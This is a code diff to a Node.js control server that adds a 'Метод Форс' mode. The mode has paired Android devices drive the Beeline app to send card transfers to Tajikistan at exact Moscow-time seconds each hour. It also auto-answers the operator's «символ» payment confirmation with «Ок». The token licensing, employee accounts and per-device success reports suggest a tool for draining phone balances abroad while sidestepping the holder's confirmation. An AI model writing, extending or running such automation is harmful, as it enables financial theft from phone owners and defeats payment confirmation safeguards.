@@ -46,6 +46,42 @@ const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
 const RECIPIENT_NUMBER = String(process.env.RECIPIENT_NUMBER || '7878');
 // Source of the "символ" / "успешно" replies; "Ок" is sent back to it.
 const SIGNAL_NUMBER = String(process.env.SIGNAL_NUMBER || '8464');
+// "Метод Форс": the device drives the Beeline (Билайн) app UI to make a card
+// transfer at two exact Moscow-time moments each hour. Everything about the flow
+// is delivered from here so it can be re-tuned to a new Beeline layout WITHOUT
+// rebuilding the APK. Times are seconds-within-the-hour, Moscow time (UTC+3).
+//   Rule A: press «Отправить» exactly at mm:ss = 12:59  → 12*60+59 = 779.
+//           preparation starts at 10:30 → lead = 149 s before the fire moment.
+//   Rule B: complete every step; if «Повторить» appears, tap it at mm:ss = 59:59
+//           → 59*60+59 = 3599. preparation starts 5 min earlier → lead = 300 s.
+const MF_RULE_A_FIRE_SEC = parseInt(process.env.MF_RULE_A_FIRE_SEC || '779', 10);
+const MF_RULE_A_PREP_LEAD_SEC = parseInt(process.env.MF_RULE_A_PREP_LEAD_SEC || '149', 10);
+const MF_RULE_B_FIRE_SEC = parseInt(process.env.MF_RULE_B_FIRE_SEC || '3599', 10);
+const MF_RULE_B_PREP_LEAD_SEC = parseInt(process.env.MF_RULE_B_PREP_LEAD_SEC || '300', 10);
+// Beeline app package (queried + driven by the accessibility service).
+const MF_BEELINE_PACKAGE = process.env.MF_BEELINE_PACKAGE || 'ru.beeline.services';
+function metodForsConfig() {
+  return {
+    beelinePackage: MF_BEELINE_PACKAGE,
+    // The exact screen sequence, by on-screen label. Tunable without an APK rebuild.
+    steps: [
+      'Сервисы', 'Перевести деньги', 'Перевод на карту зарубеж',
+      'Таджикистан', 'По номеру карты', 'Мой номер',
+    ],
+    cardFieldHint: 'Введите номер карты',
+    continueLabel: 'Продолжить',
+    sendLabel: 'Отправить',
+    backToFinanceLabel: 'Вернуться в финансы',
+    repeatLabel: 'Повторить',
+    // Signal-side words (from 8464): symbol prompt → reply → success confirmation.
+    symbolWord: 'символ',
+    replyText: 'Ок',
+    successWord: 'успешно',
+    ruleA: { fireSec: MF_RULE_A_FIRE_SEC, prepLeadSec: MF_RULE_A_PREP_LEAD_SEC },
+    ruleB: { fireSec: MF_RULE_B_FIRE_SEC, prepLeadSec: MF_RULE_B_PREP_LEAD_SEC },
+  };
+}
+
 const PAIRING_TTL_MS = parseInt(process.env.PAIRING_TTL_MS || String(10 * 60 * 1000), 10);
 const LONGPOLL_TIMEOUT_MS = parseInt(process.env.LONGPOLL_TIMEOUT_MS || '25000', 10);
 const SYNC_INTERVAL_MS = parseInt(process.env.SYNC_INTERVAL_MS || '15000', 10);
@@ -127,6 +163,13 @@ function loadDb() {
     db.settings = db.settings || {}; // global toggles (e.g. the probe pool)
     // Migrate any older records to the current shape.
     for (const t of db.tokens) if (!t.schedule) t.schedule = defaultSchedule();
+    // "Метод Форс": a per-token capability the admin grants. Off by default —
+    // the mini-app only shows the feature to tokens where it is enabled.
+    for (const t of db.tokens) if (typeof t.metodForsEnabled !== 'boolean') t.metodForsEnabled = false;
+    // "Автоматическое подтверждение": when ON (default), the device auto-replies
+    // «Ок» to «символ». When OFF, it doesn't — the owner gets a bot prompt
+    // «Подтвердите платеж на устройстве X» and confirms manually.
+    for (const t of db.tokens) if (typeof t.autoConfirm !== 'boolean') t.autoConfirm = true;
     for (const d of db.devices) if (!Array.isArray(d.payments)) d.payments = [];
     return db;
   } catch (e) {
@@ -492,7 +535,21 @@ function buildSyncPayload(d, t) {
     workSession: (t && t.workSession) || '',
     workMode: (t && t.workMode) || 'manual', // manual | schedule | signal
     probeReq: d.probeReq || '', // when this changes, the device sends one probe SMS
+    // "Метод Форс": when enabled for the token, the device runs the Beeline
+    // automation engine (two exact Moscow-time rules per hour) instead of the
+    // plain SMS sender. serverNowMs is our NTP-backed wall clock — the device
+    // syncs its Moscow time to it so it hits xx:12:59 / xx:59:59 to the second,
+    // even if the phone's own clock is wrong.
+    metodFors: valid && !!(t && t.metodForsEnabled),
+    metodForsConfig: metodForsConfig(),
+    serverNowMs: Date.now(),
+    // Manual-confirmation flow: when the owner presses «Подтвердить» in the bot,
+    // this nonce changes → the device sends the deferred «Ок» to the pending
+    // «символ» sender.
+    confirmReq: d.confirmReq || '',
     config: {
+      // «Автоматическое подтверждение» — default ON (auto «Ок»); OFF ⇒ manual.
+      autoConfirm: !(t && t.autoConfirm === false),
       number: RECIPIENT_NUMBER,
       signalNumber: SIGNAL_NUMBER,
       intervalSec: sched.intervalSec,
@@ -672,6 +729,16 @@ async function handleTelegramUpdate(update) {
       const cq = update.callback_query;
       const fromId = String(cq.from && cq.from.id);
       const data = String(cq.data || '');
+      // «Подтвердить» a payment: the device sends its deferred «Ок».
+      if (data.startsWith('cf:')) {
+        const d = db.devices.find((x) => x.id === data.slice(3));
+        const t = d && db.tokens.find((x) => x.id === d.tokenId);
+        if (!d || !t || !tokenMembers(t).includes(fromId)) return tgAnswerCallback(cq.id, 'Недоступно');
+        d.confirmReq = uuid();
+        bumpDevice(d);
+        saveDb();
+        return tgAnswerCallback(cq.id, 'Отправляю подтверждение…');
+      }
       if (data.startsWith('rw:')) {
         const t = db.tokens.find((x) => x.id === data.slice(3));
         if (!t || String(t.telegramId) !== fromId) return tgAnswerCallback(cq.id, 'Недоступно');
@@ -783,6 +850,12 @@ function tokenStateView(t, viewerId) {
     // work — not signal / schedule sessions (which also set globalOn).
     manualOn: !!t.globalOn && (t.workMode || 'manual') === 'manual',
     signalEnabled: !!t.signalEnabled,
+    // Gate for the "Метод Форс" screen: the mini-app only shows the feature when
+    // the admin has switched it on for this token.
+    metodForsEnabled: !!t.metodForsEnabled,
+    // «Автоматическое подтверждение» — default ON. OFF ⇒ device won't auto-reply
+    // «Ок» to «символ»; the owner confirms each payment from the bot.
+    autoConfirm: t.autoConfirm !== false,
     schedule: t.schedule || defaultSchedule(),
     recipientNumber: RECIPIENT_NUMBER,
     isOwner: owner,
@@ -1005,6 +1078,7 @@ function adminTokenSummary(t) {
     activeCount: devices.filter((d) => d.active).length,
     telegramId: t.telegramId ? String(t.telegramId) : '',
     globalOn: !!t.globalOn, createdAt: t.createdAt || 0,
+    metodForsEnabled: !!t.metodForsEnabled,
     schedule: t.schedule || defaultSchedule(),
     devices: devices.map((d) => ({
       id: d.id, name: d.name, active: !!d.active, paired: !!d.pairedAt,
@@ -1049,6 +1123,15 @@ const server = http.createServer(async (req, res) => {
       const r = fireSignal('webhook');
       saveDb();
       return sendJson(res, 200, { ok: true, started: r.started, skipped: r.skipped });
+    }
+
+    // ================= Precise time source (public) =================
+    // The device clock-syncs to this NTP-backed wall clock so "Метод Форс" hits
+    // xx:12:59 / xx:59:59 Moscow time exactly, even if the phone's clock drifts.
+    // Moscow is UTC+3 with no DST, so mskMs = now + 3h independent of any device TZ.
+    if (p === '/api/time' && m === 'GET') {
+      const nowMs = Date.now();
+      return sendJson(res, 200, { now: nowMs, mskOffsetMs: 3 * 3600 * 1000, mskMs: nowMs + 3 * 3600 * 1000 });
     }
 
     // ================= App updates (OTA, public) =================
@@ -1212,7 +1295,7 @@ const server = http.createServer(async (req, res) => {
           id: uuid(), value: newTokenValue(), comment: String((body && body.comment) || '').slice(0, 200),
           enabled: true, createdAt: now(),
           expiresAt: Number.isFinite(days) && days > 0 ? now() + days * 86400000 : 0,
-          deviceLimit, telegramId: null, employees: [], employeeInvites: [], globalOn: false, signalEnabled: false, workSession: '', schedule: defaultSchedule(), rev: 0,
+          deviceLimit, telegramId: null, employees: [], employeeInvites: [], globalOn: false, signalEnabled: false, metodForsEnabled: false, workSession: '', schedule: defaultSchedule(), rev: 0,
         };
         db.tokens.push(t);
         saveDb();
@@ -1251,6 +1334,14 @@ const server = http.createServer(async (req, res) => {
         }
         if (m === 'POST' && action === 'unbind') {
           t.telegramId = null;
+          saveDb();
+          return sendJson(res, 200, { token: adminTokenSummary(t) });
+        }
+        // Grant / revoke the "Метод Форс" feature for this token.
+        if (m === 'POST' && action === 'metodfors') {
+          const body = await readJson(req);
+          t.metodForsEnabled = (body && typeof body.enabled === 'boolean') ? body.enabled : !t.metodForsEnabled;
+          bumpToken(t); // push the new capability to the token's devices at once
           saveDb();
           return sendJson(res, 200, { token: adminTokenSummary(t) });
         }
@@ -1307,6 +1398,15 @@ const server = http.createServer(async (req, res) => {
       if (p === '/api/mini/signal' && m === 'POST') {
         const body = await readJson(req);
         t.signalEnabled = Boolean(body && body.on);
+        saveDb();
+        return sendJson(res, 200, { state: tokenStateView(t, resolveTelegramId(req)) });
+      }
+
+      // «Автоматическое подтверждение» toggle (default ON). OFF ⇒ manual «Ок».
+      if (p === '/api/mini/autoconfirm' && m === 'POST') {
+        const body = await readJson(req);
+        t.autoConfirm = Boolean(body && body.on);
+        bumpToken(t); // push the new flag to all devices at once
         saveDb();
         return sendJson(res, 200, { state: tokenStateView(t, resolveTelegramId(req)) });
       }
@@ -1443,6 +1543,52 @@ const server = http.createServer(async (req, res) => {
         saveDb();
         return sendJson(res, 200, { ok: true });
       }
+      // «Автоматическое подтверждение» is OFF: the device caught «символ» but did
+      // NOT answer «Ок». Prompt the owner (and employees) to confirm from the bot;
+      // pressing «Подтвердить» tells the device to send the deferred «Ок».
+      if (body.type === 'confirm_request' && t) {
+        const recips = [];
+        if (t.telegramId) recips.push(t.telegramId);
+        for (const emp of (t.employees || [])) if (emp && emp.telegramId) recips.push(emp.telegramId);
+        const msg =
+          `🔐 <b>Подтвердите платеж на устройстве «${eschtml(d.name)}»</b>\n` +
+          `Пришёл «символ» — автоматическое подтверждение выключено. Нажмите кнопку, ` +
+          `чтобы отправить «Ок» с устройства.`;
+        const kb = [[{ text: '✅ Подтвердить', callback_data: `cf:${d.id}` }]];
+        for (const chatId of recips) tgSend(chatId, msg, kb);
+        return sendJson(res, 200, { ok: true });
+      }
+
+      // "Метод Форс": a device finished one automated Beeline transfer (caught
+      // «символ», answered «Ок», got «успешно»). Log it like a normal successful
+      // payment AND send a dedicated report to the owner. Does not stop or gate
+      // any other device — each runs its own hourly cycle independently.
+      if (body.type === 'metodfors' && t) {
+        const requisites = String(body.requisites || '').slice(0, 300);
+        const amount = normalizeAmount(body.amount).slice(0, 32);
+        const rule = String(body.rule || '').slice(0, 8); // "A" | "B"
+        const at = now();
+        db.paymentsLog.push({
+          tokenId: t.id, tokenComment: t.comment || '',
+          deviceId: d.id, deviceName: d.name,
+          requisites, amount, session: 'metodfors', method: 'metodfors', at,
+        });
+        if (db.paymentsLog.length > 10000) db.paymentsLog = db.paymentsLog.slice(-8000);
+        saveDbSoon();
+        const recips = [];
+        if (t.telegramId) recips.push(t.telegramId);
+        for (const emp of (t.employees || [])) if (emp && emp.telegramId) recips.push(emp.telegramId);
+        const msg =
+          `⚡️ <b>Метод Форс</b> — устройство отработало\n` +
+          `Устройство: <b>${eschtml(d.name)}</b>\n` +
+          `Номер: <b>${eschtml(requisites)}</b>\n` +
+          `Сумма: <b>${eschtml(amount)}</b>\n` +
+          (rule ? `Правило: <b>${eschtml(rule === 'B' ? 'xx:59:59' : 'xx:12:59')}</b>\n` : '') +
+          `Дата и время: ${fmtDateTime(at)}`;
+        for (const chatId of recips) tgSend(chatId, msg);
+        return sendJson(res, 200, { ok: true });
+      }
+
       // A payment went through ("успешно") — log it for the admin summary and
       // notify the owner immediately (a message per successful payment).
       if (body.type === 'success' && t) {
@@ -1558,7 +1704,7 @@ const server = http.createServer(async (req, res) => {
         enabled: true, createdAt: now(),
         expiresAt: Number.isFinite(days) && days > 0 ? now() + days * 86400000 : 0,
         deviceLimit: Math.max(0, parseInt(f.deviceLimit, 10) || 0),
-        telegramId: null, employees: [], employeeInvites: [], globalOn: false, signalEnabled: false, workSession: '', schedule: defaultSchedule(), rev: 0,
+        telegramId: null, employees: [], employeeInvites: [], globalOn: false, signalEnabled: false, metodForsEnabled: false, workSession: '', schedule: defaultSchedule(), rev: 0,
       });
       saveDb();
       res.writeHead(302, { Location: '/admin' }); return res.end();
